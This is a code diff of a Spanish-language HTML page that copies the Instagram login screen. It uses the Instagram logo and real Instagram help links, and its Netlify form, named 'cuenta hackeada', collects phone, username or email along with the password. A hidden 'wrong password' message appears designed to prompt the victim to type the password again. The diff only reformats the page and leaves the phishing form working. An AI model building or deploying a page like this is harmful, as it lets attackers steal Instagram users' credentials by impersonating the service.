@@ -1,49 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram Inicio</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-        integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Inicio</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
 </head>
-
 <body>
-    <div class="container">
-        <div class="center">
-            <div class="header">
-                <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
-            </div>
-            <form id="form" class="inputElement" name="cuenta hackeada" netlify>
-                <input name="email" type="text" placeholder="Teléfono, Usuario o Correo Electrónico"
-                    class="inputText" />
-                <input name="password" type="password" placeholder="Contraseña" class="inputText" id="pass" />
-                <input type="submit" value="Entrar" class="inputButton" />
-                <div class="line">
-                    <span class="arrow"></span>
-                    <span class="content">O</span>
-                    <span class="arrow"></span>
-                </div>
-                <div class="incorrecta" id="incorrecta" style="display: none;">
-                    <p>Tu contraseña no es correcta. Vuelve a comprobarla.</p>
-                </div>
-            </form>
-            <div class="social__icon">
-                <i class="fab fa-facebook-square"></i><span>Ingresá con Facebook</span>
-            </div>
-            <div class="forgetPassword"><a href="https://www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?</a> </div>
-            
+  <div class="container">
+    <div class="center">
+      <div class="header">
+        <img src="instagramlogo.png" alt="instagramLogo" class="instaLogo" />
+      </div>
+      <form id="form" class="inputElement" name="cuenta hackeada" netlify>
+        <input name="email" type="text" placeholder="Teléfono, Usuario o Correo Electrónico" class="inputText" />
+        <input name="password" type="password" placeholder="Contraseña" class="inputText" id="pass" />
+        <button type="submit" class="inputButton">
+            <span class="entrar">Entrar</span>
+        </button>
+        <div class="line">
+          <span class="arrow"></span>
+          <span class="content">O</span>
+          <span class="arrow"></span>
         </div>
-        <div class="footer">
-            <p>¿No tienes una cuenta?<span><a href="https://www.instagram.com/accounts/emailsignup/">Regístrate</a> </span></p>
+        <div class="incorrecta" id="incorrecta" style="display: none;">
+          <p>Tu contraseña no es correcta. Vuelve a comprobarla.</p>
         </div>
+      </form>
+      <div class="social__icon">
+        <i class="fab fa-facebook-square"></i><span>Ingresá con Facebook</span>
+      </div>
+      <div class="forgetPassword"><a href="https://www.instagram.com/accounts/password/reset/">¿Has olvidado la contraseña?</a> </div>
     </div>
-    <script src="main.js"></script>
+    <div class="footer">
+      <p>¿No tienes una cuenta?<span><a href="https://www.instagram.com/accounts/emailsignup/"> Regístrate</a> </span></p>
+    </div>
+  </div>
+  <script src="main.js"></script>
 </body>
-
 </html>
